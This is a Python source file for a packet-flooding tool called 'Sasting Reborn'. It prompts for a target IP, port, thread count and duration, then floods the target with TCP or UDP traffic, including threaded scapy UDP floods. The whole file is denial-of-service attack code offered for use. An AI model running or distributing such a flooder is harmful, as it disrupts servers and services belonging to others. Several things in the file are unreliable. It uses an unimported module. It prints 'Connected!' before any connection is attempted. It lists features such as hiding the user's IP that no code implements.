from colorama import Fore, Style, init
import socket
import sys
import time
import random
import threading
from scapy.all import IP, UDP, Raw, send
import win32console
import os

win32console.SetConsoleTitle("Sasting Reborn | Version: 1.0.0 | dsc.gg/wearentdevs | Made by Bluer | EDITED VERSION!")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()

init(autoreset=True)  # Ensures colors reset after each print

def print_dark_purple_ascii_art(ascii_art):
    for line in ascii_art.splitlines():
        print(f"{Fore.MAGENTA}{line}{Style.RESET_ALL}")

# Replace the flood function with the one from UDPBat.py
def flood(target_ip, target_port, packet_size, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(packet_size))
            payload = f"WS-DY{payload}WS-DY"
            packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)
            send(packet, verbose=False)
        except Exception as e:
            print(Fore.RED + f"Error sending packet: {e}")

def send_packets(ip_address, port, number_of_bots, bot_speed, message, method):
    sock = None
    packega = 0
    connected_count = 0
    failed_count = 0

    try:
        if method.lower() == 'tcp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip_address, port))
        elif method.lower() == 'udp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            print(f"{Fore.MAGENTA}Invalid method. Supported methods: TCP, UDP{Style.RESET_ALL}")
            return

    except socket.error as e:
        print(f"{Fore.MAGENTA}Failed to Connect (Errno: {e.errno}){Style.RESET_ALL}")
        return

    try:
        while packega < number_of_bots:
            try:
                sock.sendall(message.encode())
                packega += 1
                time.sleep(bot_speed)
                connected_count += 1
                print(f"{Fore.MAGENTA}Bots Send --> {packega}{Style.RESET_ALL}")
            except socket.error as e:
                print(f"{Fore.MAGENTA}Error sending packet: {e}{Style.RESET_ALL}")
                failed_count += 1

    except KeyboardInterrupt:
        print("\nUser interrupted the process.")

    finally:
        if sock:
            sock.close()
        print(f"\nConnected: {connected_count} | Failed: {failed_count}")

def connect_to_ip(ip_address, port, number_of_bots):
    try:
        socket.inet_aton(ip_address)
    except socket.error:
        print(f"{Fore.MAGENTA}Failed to Connect (Errno: IP_Not_Found_101){Style.RESET_ALL}")
        return

    bot_speed = float(input("Enter bot's speed (in seconds) ---> "))
    if bot_speed < 0.01:
        print(f"{Fore.MAGENTA}Error: Bot speed cannot be less than 0.01 seconds.{Style.RESET_ALL}")
        return

    message = input("Enter TCP/UDP message (press Enter to skip) ---> ")

    method = input("Enter a Method (TCP, UDP, HTTP, ICMP) ---> ")
    
    choice = input(f"Connect to {ip_address}:{port}? (y/n): ")
    if choice.lower() == 'y':
        time.sleep(1)
        print(f"{Fore.GREEN}Connecting...{Style.RESET_ALL}")
        time.sleep(2)
        print("\n")
        time.sleep(1)
        print(f"{Fore.GREEN}Connected!{Style.RESET_ALL}")
        if method.lower() in ['tcp', 'udp']:
            send_packets(ip_address, port, number_of_bots, bot_speed, message, method)
        else:
            duration = int(input("Enter duration (in seconds) ---> "))
            packet_size = int(input("Enter packet size ---> "))
            threads = int(input("Enter number of threads ---> "))
            print(f"{Fore.GREEN}Starting UDP flooder on {ip_address}:{port} with {packet_size}-byte packets using {threads} threads for {duration} seconds.{Style.RESET_ALL}")
            for _ in range(threads):
                thread = threading.Thread(target=flood, args=(ip_address, port, packet_size, duration))
                thread.daemon = True
                thread.start()
    elif choice.lower() == 'n':
        sys.exit()
    else:
        print("Invalid choice. Please enter 'y' or 'n'.")

if __name__ == "__main__":
    ascii_art = """
    ███████╗ █████╗ ███████╗████████╗██╗███╗   ██╗ ██████╗     Made by: Bluer
    ██╔════╝██╔══██╗██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝     
    ███████╗███████║███████╗   ██║   ██║██╔██╗ ██║██║  ███╗    Edited by: Sempiller/Hatchinng
    ╚════██║██╔══██║╚════██║   ██║   ██║██║╚██╗██║██║   ██║
    ███████║██║  ██║███████║   ██║   ██║██║ ╚████║╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝     Version: 1.0ReBorn
    """

    print_dark_purple_ascii_art(ascii_art)

    print("\n\n-------------------------------------------------------------------------------------------------------")

    usage_text = """
    Properties:
    SpyMode  Your IP will be hidden when attacking.
    Speed    Set Speed of Attack per Bot.
    Message  Messages to server when connecting.
    RepChek  Checks the server's reply.
    LocalM   Uses your processor when attacking.
    Energy+  Increases lifespan by using very little RAM.
    AntiCRH  The application closes before your computer is crashed.
    """

    colored_usage_text = f"{Fore.MAGENTA}{usage_text}{Style.RESET_ALL}"
    print(colored_usage_text)

    print("\n\n-------------------------------------------------------------------------------------------------------")

    while True:
        ip_address = input("Enter IP Address ---> ")
        port = int(input("Enter Port ---> "))
        
        try:
            number_of_bots = int(input("Number of bots to send ---> "))
            connect_to_ip(ip_address, port, number_of_bots)
        except ValueError:
            print(f"{Fore.MAGENTA}Please enter a valid number.{Style.RESET_ALL}")

        exit_choice = input("\nExit? (y/n): ")
        if exit_choice.lower() == 'y':
            time.sleep(0.1)
            
            clear_screen()
            print("Any bugs? please report on https://dsc.gg/wearentdevs.")
            time.sleep(3)
            clear_screen()
            print("Edited by Sempiller/Hatchinng, Made by Bluer. THIS IS NOT A PAID TOOL, CANNOT BE SOLD FOR MONEY")
            sys.exit()
